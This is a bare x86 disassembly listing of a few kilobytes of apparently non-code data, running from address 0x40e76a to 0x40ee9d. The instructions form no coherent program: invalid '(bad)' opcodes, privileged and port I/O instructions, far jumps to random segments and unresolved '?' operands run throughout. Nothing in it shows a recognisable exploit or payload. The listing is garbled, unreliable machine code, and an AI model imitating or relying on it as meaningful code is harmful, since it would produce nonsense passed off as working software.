  40e76a:	fcomp  DWORD PTR [edx-0x5f]
  40e76d:	inc    edi
  40e76e:	push   esi
  40e76f:	shl    DWORD PTR [ebx],cl
  40e771:	arpl   WORD PTR [ebp+0x335d6ae9],cx
  40e777:	xchg   DWORD PTR [edx+eiz*8+0x30],ecx
  40e77b:	xchg   ecx,eax
  40e77c:	mov    eax,0xf2b178a3
  40e781:	test   eax,0x93ec34a1
  40e786:	cld    
  40e787:	scas   al,BYTE PTR es:[edi]
  40e788:	dec    edi
  40e789:	pop    ebp
  40e78a:	es mov bl,0x90
  40e78d:	clc    
  40e78e:	dec    ebp
  40e78f:	sub    BYTE PTR [ecx-0x35],dl
  40e792:	and    BYTE PTR [edx],ah
  40e794:	aaa    
  40e795:	ss out 0xc9,eax
  40e798:	adc    BYTE PTR [eax-0x2b],bl
  40e79b:	(bad)  
  40e79c:	sti    
  40e79d:	mov    dl,0x67
  40e79f:	dec    edx
  40e7a0:	push   ebx
  40e7a1:	or     esp,DWORD PTR [edi]
  40e7a3:	(bad)  
  40e7a4:	push   ss
  40e7a5:	sbb    bh,BYTE PTR [edx]
  40e7a7:	xchg   edi,eax
  40e7a8:	sbb    eax,0x2dd9e74a
  40e7ad:	push   esp
  40e7ae:	cmp    edi,DWORD PTR [ebx]
  40e7b0:	push   es
  40e7b1:	jmp    0x36ef5dd9
  40e7b6:	mov    ebp,0x84420ccc
  40e7bb:	(bad)  [ebx+0x448dbd85]
  40e7c1:	push   ecx
  40e7c2:	cmp    BYTE PTR ds:0xd9d9a7c1,ah
  40e7c8:	and    DWORD PTR [edi+0x78],eax
  40e7cb:	popa   
  40e7cc:	aam    0xcb
  40e7ce:	neg    DWORD PTR [ecx]
  40e7d0:	int3   
  40e7d1:	int3   
  40e7d2:	push   0x3061dc34
  40e7d7:	retf   0x9b25
  40e7da:	ret    0xa103
  40e7dd:	xor    al,BYTE PTR [edx+0x65]
  40e7e0:	push   cs
  40e7e1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e7e2:	mov    edi,0x927616cd
  40e7e7:	div    BYTE PTR [edx+0x52]
  40e7ea:	jae    0x40e812
  40e7ec:	push   edi
  40e7ed:	cmp    edi,0x5b
  40e7f0:	add    eax,0x5d316dbb
  40e7f5:	and    edx,DWORD PTR [ebx+0xb]
  40e7f8:	adc    DWORD PTR [edi],esi
  40e7fa:	leave  
  40e7fb:	fdivr  QWORD PTR [edx+0xf]
  40e7fe:	dec    ebx
  40e7ff:	and    eax,0x154f502e
  40e804:	loop   0x40e7d9
  40e806:	add    al,0x52
  40e808:	mov    esi,0x71062361
  40e80d:	(bad)  
  40e80f:	jge    0x40e7b6
  40e811:	pop    edx
  40e812:	inc    ecx
  40e813:	push   ebp
  40e814:	sbb    eax,0xc770b91
  40e819:	mov    edi,DWORD PTR [ecx-0xd60b073]
  40e81f:	imul   ecx,edi,0x1d
  40e822:	adc    BYTE PTR [esi+edx*2-0x2b3410b3],al
  40e829:	popf   
  40e82a:	xchg   ecx,eax
  40e82c:	xchg   ebx,eax
  40e82d:	mov    eax,0x36fc903e
  40e832:	cmp    DWORD PTR [ecx],ebp
  40e834:	or     esp,DWORD PTR [edx]
  40e836:	inc    esp
  40e837:	pop    ebp
  40e838:	lds    eax,FWORD PTR [eax]
  40e83a:	jecxz  0x40e805
  40e83c:	push   cs
  40e83d:	xor    bh,BYTE PTR [ebx]
  40e83f:	test   BYTE PTR [ebp+0x3b8374b1],dh
  40e845:	or     ah,BYTE PTR [eax+0x37195058]
  40e84b:	or     ah,BYTE PTR [edx]
  40e84d:	fs push ss
  40e84f:	ins    DWORD PTR es:[edi],dx
  40e850:	fadd   st(6),st
  40e852:	dec    DWORD PTR [ebx]
  40e854:	pop    ecx
  40e855:	xor    al,0x6a
  40e857:	mov    ebx,0x35b6e6e8
  40e85c:	loop   0x40e7e4
  40e85e:	ror    ch,1
  40e860:	xor    al,0xd6
  40e862:	test   dl,ah
  40e864:	sbb    al,0xc9
  40e866:	push   eax
  40e867:	xchg   edi,eax
  40e868:	mov    bl,0x2f
  40e86a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e86b:	fild   DWORD PTR [edi-0x74ce7039]
  40e871:	je     0x40e7f4
  40e873:	push   ds
  40e874:	jp     0x40e7fd
  40e876:	enter  0x3b10,0x85
  40e87a:	and    ecx,DWORD PTR [esp+esi*8+0x3864b059]
  40e881:	xchg   ebx,eax
  40e882:	repz aam 0x9
  40e885:	icebp  
  40e886:	sbb    DWORD PTR [ecx],ebp
  40e888:	and    al,0x81
  40e88a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e88b:	das    
  40e88c:	sbb    BYTE PTR [ebx],0x5e
  40e88f:	inc    ecx
  40e890:	or     cl,bl
  40e892:	sub    ecx,DWORD PTR [eax]
  40e894:	(bad)  
  40e895:	sbb    BYTE PTR ds:0xd7115624,bl
  40e89b:	and    bl,BYTE PTR [edx+0xa]
  40e89e:	mov    edx,es
  40e8a0:	sbb    esi,0x23
  40e8a3:	mov    dh,0xc
  40e8a5:	fcmovbe st,st(6)
  40e8a7:	xchg   edi,eax
  40e8a8:	scas   eax,DWORD PTR es:[edi]
  40e8a9:	dec    esp
  40e8aa:	or     bl,ah
  40e8ac:	dec    DWORD PTR [ebx]
  40e8ae:	adc    eax,0xcb2e3e10
  40e8b3:	int3   
  40e8b4:	arpl   cx,sp
  40e8b6:	jne    0x40e8d0
  40e8b8:	rcl    BYTE PTR [ebx],1
  40e8ba:	bound  esi,QWORD PTR [edi]
  40e8bc:	arpl   WORD PTR [edx-0x137a4cc2],bp
  40e8c2:	lea    esp,[esi]
  40e8c4:	(bad)  
  40e8c5:	loop   0x40e8bb
  40e8c7:	add    al,0x4d
  40e8c9:	aaa    
  40e8ca:	push   cs
  40e8cb:	ss int3 
  40e8cd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e8ce:	xchg   al,cl
  40e8d0:	push   edx
  40e8d1:	jmp    0x16a82207
  40e8d6:	stc    
  40e8d7:	dec    eax
  40e8d8:	add    DWORD PTR [esi],0x20
  40e8db:	and    eax,0xe8d70fb6
  40e8e0:	mov    eax,0x849d7928
  40e8e5:	es and eax,0x481cb901
  40e8eb:	int3   
  40e8ec:	cld    
  40e8ed:	push   0xffffffd6
  40e8ef:	aaa    
  40e8f0:	fsubr  QWORD PTR [esi-0x36]
  40e8f3:	sahf   
  40e8f4:	mov    bl,0x1d
  40e8f6:	dec    edi
  40e8f7:	adc    edi,DWORD PTR [esi+0xa]
  40e8fa:	in     al,0x9f
  40e8fc:	int3   
  40e8fd:	out    dx,al
  40e8fe:	stos   DWORD PTR es:[edi],eax
  40e8ff:	inc    edi
  40e900:	push   ds
  40e901:	imul   edx,DWORD PTR [ebx+0x74],0x55aafbec
  40e908:	pop    esp
  40e909:	daa    
  40e90a:	sub    ch,BYTE PTR [ecx+eax*1]
  40e90d:	in     al,0x90
  40e90f:	xor    ebp,DWORD PTR [esi]
  40e911:	das    
  40e912:	jno    0x40e905
  40e914:	jno    0x40e91c
  40e916:	sub    esp,DWORD PTR cs:[eax-0x3304d7e9]
  40e91d:	les    edi,FWORD PTR [edi-0xc]
  40e920:	push   ebx
  40e921:	(bad)  
  40e922:	cld    
  40e923:	call   0xcdf9b22c
  40e928:	ret    0x39a3
  40e92b:	loopne 0x40e955
  40e92d:	jecxz  0x40e915
  40e92f:	add    bh,BYTE PTR [ebx-0x19]
  40e932:	xchg   ebp,eax
  40e933:	mov    ds:0xd0ca50a1,eax
  40e938:	fisttp WORD PTR [ebx+edi*4+0x6b53d3ad]
  40e93f:	cmp    BYTE PTR [edx+0x587b05a5],ah
  40e945:	push   ds
  40e946:	imul   ebp,edi,0x4f
  40e949:	jb     0x40e9c3
  40e94b:	shl    BYTE PTR [edx-0x1e7f35d2],cl
  40e951:	dec    edx
  40e952:	data16 cmc 
  40e954:	ror    esi,0xac
  40e957:	cwde   
  40e958:	inc    ecx
  40e959:	mov    eax,gs
  40e95b:	mov    cl,0xf0
  40e95d:	jg     0x40e9d0
  40e95f:	sbb    dh,bh
  40e961:	xchg   dx,ax
  40e963:	dec    ebp
  40e964:	inc    ecx
  40e965:	dec    esi
  40e966:	push   ebx
  40e967:	xlat   BYTE PTR ds:[ebx]
  40e968:	sbb    al,0xd3
  40e96a:	or     esi,DWORD PTR ds:0xb8e8184
  40e970:	adc    eax,0xa64d6128
  40e975:	cs fxch st(1)
  40e978:	inc    ebp
  40e979:	clc    
  40e97a:	push   ss
  40e97b:	and    BYTE PTR [edi-0x62],ah
  40e97e:	into   
  40e97f:	and    cl,BYTE PTR [edi-0x53]
  40e982:	xchg   ebx,eax
  40e983:	mov    ebx,esp
  40e985:	dec    ebp
  40e986:	rcr    DWORD PTR [eax],1
  40e988:	cmp    DWORD PTR ds:0x62106cd,0xffffff8c
  40e98f:	into   
  40e990:	hlt    
  40e991:	sub    ecx,DWORD PTR [eax-0x5]
  40e994:	sub    bl,ah
  40e996:	cmp    ch,BYTE PTR [edi+0x6667ab29]
  40e99c:	push   ecx
  40e99d:	mov    sp,0x68b6
  40e9a1:	faddp  st(1),st
  40e9a3:	ret    
  40e9a4:	mov    esi,0xdf345bcc
  40e9a9:	repz jge 0x40e9f5
  40e9ac:	fild   DWORD PTR [eax+0x41]
  40e9af:	jbe    0x40e99d
  40e9b1:	push   es
  40e9b2:	xchg   ebp,eax
  40e9b3:	cmp    cl,bh
  40e9b5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e9b6:	loop   0x40e9b5
  40e9b8:	lock mov esi,0x90ff1752
  40e9be:	mov    edi,0xcf33e76b
  40e9c3:	push   es
  40e9c4:	lock sub ecx,DWORD PTR gs:[ebx]
  40e9c8:	sbb    ch,0xbf
  40e9cb:	cmp    DWORD PTR [ebx+0x66cf4020],ebx
  40e9d1:	hlt    
  40e9d2:	add    ch,BYTE PTR [ebp-0x15]
  40e9d5:	scas   al,BYTE PTR es:[edi]
  40e9d6:	ret    0x1d90
  40e9d9:	sub    eax,0x662a5c5d
  40e9de:	cmp    DWORD PTR [edx+0x3d3dddb2],edx
  40e9e4:	jle    0x40e9df
  40e9e6:	or     BYTE PTR [edi-0x6a456178],ch
  40e9ec:	jae    0x40ea29
  40e9ee:	daa    
  40e9ef:	xchg   DWORD PTR [ecx+0x46a6a519],edx
  40e9f5:	mov    ebp,0xc76cfcb9
  40e9fa:	push   edi
  40e9fb:	inc    eax
  40e9fc:	push   edi
  40e9fd:	loope  0x40ea21
  40e9ff:	iret   
  40ea00:	jnp    0x40e9a0
  40ea02:	jo     0x40e99a
  40ea04:	mov    gs,cx
  40ea07:	icebp  
  40ea08:	aam    0x93
  40ea0a:	jle    0x40ea77
  40ea0c:	int    0x5f
  40ea0e:	sub    al,0xde
  40ea10:	inc    ecx
  40ea11:	iret   
  40ea12:	pop    esp
  40ea13:	jb     0x40ea01
  40ea15:	in     eax,0x69
  40ea17:	inc    edi
  40ea18:	(bad)  
  40ea19:	in     eax,0xde
  40ea1b:	xchg   ecx,eax
  40ea1c:	xor    esp,edi
  40ea1e:	imul   edi,ecx,0x43adcc50
  40ea24:	mov    bh,0x94
  40ea26:	outs   dx,BYTE PTR ds:[esi]
  40ea27:	inc    ecx
  40ea28:	cmc    
  40ea29:	(bad)  
  40ea2a:	repz into 
  40ea2c:	fsub   st,st(7)
  40ea2e:	outs   dx,BYTE PTR ds:[esi]
  40ea2f:	es js  0x40ea54
  40ea32:	ins    DWORD PTR es:[edi],dx
  40ea33:	jne    0x40ea0d
  40ea35:	push   esi
  40ea36:	stos   DWORD PTR es:[edi],eax
  40ea37:	dec    edx
  40ea38:	iret   
  40ea39:	dec    ecx
  40ea3a:	sub    ebx,DWORD PTR [edx+0x38c7e774]
  40ea40:	inc    ecx
  40ea41:	adc    ebp,esp
  40ea43:	jns    0x40e9ec
  40ea45:	jnp    0x40ea35
  40ea47:	jmp    0xa24c:0xa8dce6a4
  40ea4e:	pop    es
  40ea4f:	syscall 
  40ea51:	(bad)  
  40ea52:	pop    ss
  40ea53:	xlat   BYTE PTR ds:[ebx]
  40ea54:	aam    0xf
  40ea56:	mov    dh,0xb7
  40ea58:	mov    al,0x38
  40ea5a:	fwait
  40ea5b:	test   DWORD PTR [ebp+0x54523db7],0xc055f02a
  40ea65:	mov    edi,0x3fae4eef
  40ea6a:	out    0xb0,al
  40ea6c:	ret    
  40ea6d:	shl    DWORD PTR [eax+0x5a7e18c8],0x6
  40ea74:	and    eax,0x23a8e797
  40ea79:	call   0x7417d901
  40ea7e:	mov    BYTE PTR [ebp-0x1525aa6f],dh
  40ea84:	push   0x6e5d5806
  40ea89:	sbb    DWORD PTR [edi],edx
  40ea8b:	sub    DWORD PTR [ebx-0xc],eax
  40ea8e:	lods   al,BYTE PTR ds:[esi]
  40ea8f:	test   eax,0xb77a4d04
  40ea94:	pop    esp
  40ea95:	mov    edx,0xd2c96457
  40ea9a:	scas   al,BYTE PTR es:[edi]
  40ea9b:	mul    DWORD PTR [ebp+0x77d52de2]
  40eaa1:	push   0x71
  40eaa3:	pop    esi
  40eaa4:	ror    BYTE PTR [ecx-0xb],1
  40eaa7:	cmp    eax,0xea1e79c
  40eaac:	sbb    al,0xe9
  40eaae:	inc    ebp
  40eaaf:	scas   al,BYTE PTR es:[edi]
  40eab0:	scas   eax,DWORD PTR es:[edi]
  40eab1:	sub    DWORD PTR [ebx+0x53],ebp
  40eab4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40eab5:	and    BYTE PTR [ebp+0x7cb51b88],0xd7
  40eabc:	jl     0x40eb09
  40eabe:	pop    edx
  40eabf:	mov    ss,esi
  40eac1:	cmp    esp,DWORD PTR [eax+esi*1-0x22]
  40eac5:	call   0x533a:0x377483ca
  40eacc:	and    ch,BYTE PTR [esi]
  40eace:	jge    0x40eada
  40ead0:	xchg   DWORD PTR [ecx],edi
  40ead2:	repz dec edi
  40ead4:	in     eax,0x7e
  40ead6:	js     0x40eade
  40ead8:	push   ss
  40ead9:	shl    bl,cl
  40eadb:	xchg   esp,eax
  40eadc:	inc    ebp
  40eadd:	mov    ebx,0xe3291623
  40eae2:	iret   
  40eae3:	dec    edx
  40eae4:	leave  
  40eae5:	push   edi
  40eae6:	aad    0x66
  40eae8:	and    bh,BYTE PTR [ecx-0x75]
  40eaeb:	loopne 0x40eb37
  40eaed:	or     eax,0xe3935c1a
  40eaf2:	mov    BYTE PTR [edi],0xee
  40eaf5:	pusha  
  40eaf6:	fsub   QWORD PTR [ebp-0xa]
  40eaf9:	es xchg edi,eax
  40eafb:	das    
  40eafc:	loopne 0x40eb30
  40eafe:	dec    esi
  40eaff:	jo     0x40eb11
  40eb01:	mov    esi,0x3b60a335
  40eb06:	push   ebp
  40eb07:	jae    0x40eb0d
  40eb09:	jnp    0x40eb34
  40eb0b:	sub    ebp,DWORD PTR [esi]
  40eb0d:	mov    bh,0x4b
  40eb0f:	and    BYTE PTR [edi-0x45],0x86
  40eb13:	shl    BYTE PTR [ebx-0x4b],cl
  40eb16:	jmp    0xf29c:0xb66c85f7
  40eb1d:	in     eax,dx
  40eb1e:	xor    eax,0xf28ac661
  40eb23:	aaa    
  40eb24:	test   eax,0x5987ceeb
  40eb29:	in     al,dx
  40eb2a:	mov    bl,0x43
  40eb2c:	std    
  40eb2d:	aam    0x87
  40eb2f:	pop    eax
  40eb30:	pop    ss
  40eb31:	push   es
  40eb32:	jg     0x40eac8
  40eb34:	ror    DWORD PTR [eax-0x58],cl
  40eb37:	xchg   ebp,eax
  40eb38:	push   es
  40eb39:	pop    ds
  40eb3a:	and    esi,DWORD PTR [ecx-0x7a47eb89]
  40eb40:	pop    edi
  40eb41:	loope  0x40eb3e
  40eb43:	or     al,0xba
  40eb45:	dec    eax
  40eb46:	add    BYTE PTR [ebx-0x1c],dh
  40eb49:	sti    
  40eb4a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40eb4b:	sbb    al,0xa9
  40eb4d:	mov    cl,0x1a
  40eb4f:	xor    al,0xce
  40eb51:	scas   al,BYTE PTR es:[edi]
  40eb52:	mov    ds:0xdaeb38a1,eax
  40eb57:	mov    ebx,0xa6142ab0
  40eb5c:	sar    DWORD PTR [eax-0x42297fb1],0x61
  40eb63:	cs mov al,0x30
  40eb66:	loope  0x40eb66
  40eb68:	pop    ebx
  40eb69:	adc    ecx,esp
  40eb6b:	das    
  40eb6c:	xor    DWORD PTR [edi+0xfa7f8c],0xffffffb7
  40eb73:	ret    0x8b74
  40eb76:	dec    esp
  40eb77:	push   edi
  40eb78:	push   ebx
  40eb79:	aam    0x48
  40eb7b:	clc    
  40eb7c:	and    al,0xb9
  40eb7e:	shl    DWORD PTR [edi-0x3682e20e],1
  40eb84:	fwait
  40eb85:	popf   
  40eb86:	inc    ecx
  40eb87:	push   esi
  40eb88:	bound  ecx,QWORD PTR [ebp+0xf]
  40eb8b:	adc    DWORD PTR [edx-0x5b12748c],ecx
  40eb91:	cmp    DWORD PTR [ecx+esi*1-0x39296669],0x225a54bb
  40eb9c:	xor    DWORD PTR [esi],eax
  40eb9e:	imul   eax,DWORD PTR [ebp+edi*4+0xc],0x2701fc42
  40eba6:	add    ch,dl
  40eba8:	jge    0x40eb6b
  40ebaa:	into   
  40ebab:	les    ecx,FWORD PTR ds:0xc802bd42
  40ebb1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ebb2:	(bad)  
  40ebb3:	dec    ecx
  40ebb4:	shl    eax,1
  40ebb6:	(bad)  
  40ebb8:	inc    edi
  40ebb9:	stos   DWORD PTR es:[edi],eax
  40ebba:	sbb    al,0x62
  40ebbc:	mov    edx,DWORD PTR [esi-0x4a]
  40ebbf:	cmp    DWORD PTR [ebp+0x3a],ebx
  40ebc2:	dec    ecx
  40ebc3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ebc4:	lock not BYTE PTR [edx-0x58851dfa]
  40ebcb:	pop    ecx
  40ebcc:	pop    es
  40ebcd:	fcomp  st(4)
  40ebcf:	jb     0x40eb86
  40ebd1:	xchg   edx,eax
  40ebd2:	sub    al,0x66
  40ebd4:	dec    ecx
  40ebd5:	in     al,0x33
  40ebd7:	sbb    eax,DWORD PTR [edx+0x63]
  40ebda:	pop    eax
  40ebdb:	dec    esi
  40ebdc:	inc    ebx
  40ebdd:	cmp    BYTE PTR gs:[ecx+0x2e],dh
  40ebe1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ebe2:	sub    al,0x14
  40ebe4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ebe5:	cs mov ebp,0xfc37c746
  40ebeb:	mov    ds,WORD PTR [ebx]
  40ebed:	ja     0x40eb83
  40ebef:	lahf   
  40ebf0:	xor    ah,BYTE PTR [ebp+esi*8+0x1ede070f]
  40ebf7:	call   0xfaf9:0x41e7bd1b
  40ebfe:	jge    0x40ebf5
  40ec00:	mov    cl,0xb0
  40ec02:	adc    BYTE PTR [edx-0x25e31d1e],al
  40ec08:	scas   eax,DWORD PTR es:[edi]
  40ec09:	add    DWORD PTR [eax],0x1b6db1ea
  40ec0f:	push   ebp
  40ec10:	jb     0x40ec0a
  40ec12:	push   0xffffffbd
  40ec14:	out    0x31,al
  40ec16:	adc    ah,BYTE PTR [ecx+0x44677e1c]
  40ec1c:	(bad)  
  40ec1e:	add    ch,bh
  40ec20:	dec    esi
  40ec21:	jg     0x40ec1a
  40ec23:	ficom  WORD PTR [ecx]
  40ec25:	das    
  40ec26:	call   0xca549a74
  40ec2b:	adc    DWORD PTR [ecx+ebp*2],ebx
  40ec2e:	push   0xea7dd6f2
  40ec33:	aaa    
  40ec34:	loopne 0x40ebf9
  40ec36:	xor    bl,dh
  40ec38:	lahf   
  40ec39:	mov    ds:0x870a65cb,al
  40ec3e:	lock mov al,BYTE PTR [edx-0x3fe71ca8]
  40ec45:	mov    dh,0x53
  40ec47:	sahf   
  40ec48:	push   esi
  40ec49:	dec    edi
  40ec4a:	mov    edi,0x8e7c20a8
  40ec4f:	and    al,0x90
  40ec51:	shl    DWORD PTR [edx-0x1b],0x50
  40ec55:	(bad)  
  40ec56:	sahf   
  40ec57:	jno    0x40ec7f
  40ec59:	cdq    
  40ec5a:	pop    ds
  40ec5b:	push   ecx
  40ec5c:	inc    eax
  40ec5d:	test   ch,ch
  40ec5f:	in     al,dx
  40ec60:	push   ecx
  40ec61:	fwait
  40ec62:	data16 std 
  40ec64:	mov    ecx,0x3b2ca5d1
  40ec69:	push   es
  40ec6a:	xchg   edx,eax
  40ec6b:	test   eax,0x3164a3b5
  40ec70:	gs xchg esp,eax
  40ec72:	(bad)  
  40ec73:	jge    0x40ec3a
  40ec75:	sbb    al,0x0
  40ec77:	mov    edx,0xfe83522e
  40ec7c:	sub    eax,0xf55166c3
  40ec81:	xchg   esp,ebp
  40ec83:	leave  
  40ec84:	jb     0x40ec5e
  40ec86:	xor    DWORD PTR [eax+0x22],esp
  40ec89:	rcr    DWORD PTR [ebx+0x67b1e39],0xc1
  40ec90:	sbb    eax,0xc2c9bb52
  40ec95:	hlt    
  40ec96:	xor    DWORD PTR [ecx+ebp*1],ecx
  40ec99:	(bad)  
  40ec9b:	cdq    
  40ec9c:	inc    ecx
  40ec9d:	mov    dl,0x76
  40ec9f:	outs   dx,BYTE PTR ds:[esi]
  40eca0:	jge    0x40ec52
  40eca2:	repnz push ds
  40eca4:	push   eax
  40eca5:	inc    dl
  40eca7:	or     eax,0x395ebd62
  40ecac:	das    
  40ecad:	shr    BYTE PTR [edx-0x5a25e618],0x75
  40ecb4:	pop    ss
  40ecb5:	add    eax,0xf5348970
  40ecba:	or     BYTE PTR [edi+0x16],al
  40ecbd:	jge    0x40ec8b
  40ecbf:	dec    edi
  40ecc0:	punpcklwd mm4,DWORD PTR [eax-0x4b]
  40ecc4:	jle    0x40ecf1
  40ecc6:	adc    al,0xc9
  40ecc8:	rcl    DWORD PTR [esi-0x7104ed75],cl
  40ecce:	out    0x8d,eax
  40ecd0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ecd1:	mov    dl,0xaa
  40ecd3:	bound  edi,QWORD PTR [edx+0x22]
  40ecd6:	popf   
  40ecd7:	cdq    
  40ecd8:	test   BYTE PTR [edi+0x3e6f93a6],dl
  40ecde:	pop    ecx
  40ecdf:	mov    ds:0x9a32df96,al
  40ece4:	jb     0x40ed29
  40ece6:	sbb    DWORD PTR [eax],ebx
  40ece8:	daa    
  40ece9:	clc    
  40ecea:	and    BYTE PTR [edi+0x6f47a494],0x38
  40ecf1:	sub    ebx,esp
  40ecf3:	ret    0xdad5
  40ecf6:	jecxz  0x40ed5e
  40ecf8:	mov    eax,es:0x127a0a0f
  40ecfe:	inc    esp
  40ecff:	push   edx
  40ed00:	stos   BYTE PTR es:[edi],al
  40ed01:	or     al,0x8e
  40ed03:	scas   eax,DWORD PTR es:[edi]
  40ed04:	mov    al,ds:0x7fd58adc
  40ed09:	ret    0xf412
  40ed0c:	push   ds
  40ed0d:	fcomp  DWORD PTR [ebx+edi*4+0x74]
  40ed11:	mov    ch,0x1e
  40ed13:	aam    0x48
  40ed15:	add    esp,DWORD PTR [ecx-0x7828a96]
  40ed1b:	mov    eax,?
  40ed1d:	pop    ss
  40ed1e:	mov    cs,eax
  40ed20:	mov    ds:0x43f43ce4,al
  40ed25:	rcl    ecx,cl
  40ed27:	mov    ds:0xeab3f4db,eax
  40ed2c:	pop    ss
  40ed2d:	popa   
  40ed2e:	test   eax,0xf9e966dd
  40ed33:	or     al,0xb
  40ed35:	rcl    BYTE PTR [ecx-0x36de30b5],1
  40ed3b:	jmp    0x40ed1b
  40ed3d:	dec    esp
  40ed3e:	push   es
  40ed3f:	mov    esi,0x961fb4c7
  40ed44:	inc    ebp
  40ed45:	ja     0x40ece1
  40ed47:	push   es
  40ed48:	fdivr  DWORD PTR [eax-0x18]
  40ed4b:	out    0xea,al
  40ed4d:	pusha  
  40ed4e:	clc    
  40ed4f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ed50:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ed51:	sbb    BYTE PTR [esi],0x84
  40ed54:	push   edi
  40ed55:	pmaddwd mm5,QWORD PTR [edi]
  40ed58:	stc    
  40ed59:	jmp    0x80c6:0x85b30437
  40ed60:	or     al,0xd8
  40ed62:	push   ds
  40ed63:	push   ss
  40ed64:	mov    ?,WORD PTR ds:0x673cd74c
  40ed6a:	js     0x40edc3
  40ed6c:	fimul  DWORD PTR [edi]
  40ed6e:	mov    dh,0xe4
  40ed70:	loop   0x40ed46
  40ed72:	push   eax
  40ed73:	in     eax,dx
  40ed74:	int3   
  40ed75:	mov    esi,0x58cb531c
  40ed7a:	push   cs
  40ed7b:	inc    esi
  40ed7c:	adc    esp,esi
  40ed7e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ed7f:	mov    bl,0x52
  40ed81:	ret    
  40ed82:	jl     0x40eded
  40ed84:	lahf   
  40ed85:	ds cmp al,0x98
  40ed88:	mov    dl,BYTE PTR [ecx+0x36]
  40ed8b:	add    DWORD PTR [esi+0x23],esp
  40ed8e:	cmp    DWORD PTR [eax],esi
  40ed90:	loope  0x40ed13
  40ed92:	fdivr  DWORD PTR [ecx+0x78]
  40ed95:	push   0xb9e7573e
  40ed9a:	mov    WORD PTR [edx-0x21382bd1],?
  40eda0:	cwde   
  40eda1:	gs sahf 
  40eda3:	iret   
  40eda4:	imul   edi,esp,0xffffffb8
  40eda7:	or     ebx,esi
  40eda9:	pop    ss
  40edaa:	mov    ah,0xca
  40edac:	pop    ebx
  40edad:	xchg   edx,eax
  40edae:	push   esp
  40edaf:	mov    ebp,0xace24549
  40edb4:	std    
  40edb5:	repnz mov DWORD PTR [edx+edi*2+0x839912b],esi
  40edbd:	(bad)
  40edc1:	mov    bl,0x4e
  40edc3:	xchg   edi,eax
  40edc4:	pop    esp
  40edc5:	adc    BYTE PTR [eax+0x3b],cl
  40edc8:	adc    dh,BYTE PTR [ebp+0x43]
  40edcb:	push   ss
  40edcc:	mov    dh,0x7b
  40edce:	pop    ecx
  40edcf:	sbb    ebp,ebp
  40edd1:	rcl    BYTE PTR [esi-0x55],1
  40edd4:	call   0xc2ba22d8
  40edd9:	push   esp
  40edda:	add    BYTE PTR [eax+0x73],0xe2
  40edde:	div    BYTE PTR [esi]
  40ede0:	sbb    edx,DWORD PTR [esp+ebp*8]
  40ede3:	stos   BYTE PTR es:[edi],al
  40ede4:	push   ds
  40ede5:	xchg   edi,eax
  40ede6:	inc    edi
  40ede7:	fcmovbe st,st(5)
  40ede9:	push   es
  40edea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40edeb:	int3   
  40edec:	pop    esi
  40eded:	ficomp DWORD PTR [ecx-0x2a]
  40edf0:	loope  0x40edd9
  40edf2:	(bad)
  40edf5:	jg     0x40ee5e
  40edf7:	jmp    0x6873:0xe988be60
  40edfe:	and    ch,BYTE PTR [edi]
  40ee00:	push   ss
  40ee01:	stos   DWORD PTR es:[edi],eax
  40ee02:	rol    DWORD PTR [eax],0xa
  40ee05:	dec    esp
  40ee06:	stos   DWORD PTR es:[edi],eax
  40ee07:	sbb    BYTE PTR [eax+0x0],ch
  40ee0a:	int    0x2e
  40ee0c:	hlt    
  40ee0d:	push   eax
  40ee0e:	sbb    dh,bh
  40ee10:	das    
  40ee11:	lods   eax,DWORD PTR ds:[esi]
  40ee12:	fild   WORD PTR [edi]
  40ee14:	sub    edi,edx
  40ee16:	sbb    ebp,edi
  40ee18:	sub    al,0x25
  40ee1a:	mov    al,ds:0x80f679c8
  40ee1f:	sbb    eax,0xe99d395b
  40ee24:	outs   dx,BYTE PTR ds:[esi]
  40ee25:	jne    0x40eea3
  40ee27:	sar    esp,0x9f
  40ee2a:	std    
  40ee2b:	inc    edi
  40ee2c:	out    0xcc,al
  40ee2e:	aaa    
  40ee2f:	in     al,dx
  40ee30:	jp     0x40ee1a
  40ee32:	sbb    al,0x31
  40ee34:	pop    ds
  40ee35:	out    0x88,eax
  40ee37:	(bad)  
  40ee39:	(bad)  
  40ee3a:	push   0x2e758bda
  40ee3f:	cs pop ebp
  40ee41:	or     DWORD PTR [ebx-0x62030338],ebp
  40ee47:	mov    ecx,edi
  40ee49:	dec    eax
  40ee4a:	imul   esp,DWORD PTR [edx+0x7cb1df33],0xffffffc1
  40ee51:	test   eax,0x232b608
  40ee56:	jmp    0x50af52cd
  40ee5b:	cld    
  40ee5c:	xor    ebx,DWORD PTR [edi+0x83d539b]
  40ee62:	outs   dx,BYTE PTR ds:[esi]
  40ee64:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ee65:	xor    eax,0xbaa619d7
  40ee6a:	xor    eax,0xf6368ff6
  40ee6f:	fistp  DWORD PTR [edx]
  40ee71:	neg    BYTE PTR [ecx]
  40ee73:	ins    BYTE PTR es:[edi],dx
  40ee74:	add    DWORD PTR [esi+0x53bec851],ebx
  40ee7a:	xor    edi,DWORD PTR [ecx+edi*1]
  40ee7d:	mov    esi,0x39289187
  40ee82:	dec    esp
  40ee83:	inc    esp
  40ee84:	xchg   esp,eax
  40ee85:	sbb    BYTE PTR [edi-0x3a],dh
  40ee88:	pop    eax
  40ee89:	dec    eax
  40ee8a:	xchg   ecx,eax
  40ee8b:	and    cl,dl
  40ee8d:	or     edx,DWORD PTR [esi+0x365e7b51]
  40ee93:	mov    edi,0x297bd5af
  40ee98:	inc    ebx
  40ee99:	std    
  40ee9a:	int3   
  40ee9b:	aam    0x51
  40ee9d:	jne    0x40eed0
